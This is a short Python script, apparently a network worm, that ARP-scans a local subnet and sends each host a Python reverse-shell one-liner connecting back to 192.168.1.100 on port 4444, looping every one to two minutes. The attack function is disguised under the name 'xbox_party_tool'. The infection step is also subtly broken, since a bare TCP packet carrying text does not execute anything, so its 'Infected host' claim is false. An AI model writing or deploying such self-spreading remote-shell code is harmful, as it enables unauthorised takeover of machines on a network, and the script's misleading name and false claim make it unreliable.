from scapy.all import *
import os
import sys
import time
import random

def scan_network(net):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net)
    answered = srp(arp_request, timeout=1, verbose=0)[0]
    return [received.psrc for received in answered]

def infect_host(host):
    # Use a reverse shell payload
    send(IP(dst=host)/TCP()/"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    print(f"Infected host: {host}")

# Main worm logic
def xbox_party_tool():
    net = "192.168.1.0/24"  # Replace with your network range
    while True:
        active_hosts = scan_network(net)
        for host in active_hosts:
            infect_host(host)
        # Sleep for a random interval between 1 and 2 minutes
        time.sleep(random.randint(60, 120))

# Entry point
if __name__ == "__main__":
    xbox_party_tool()
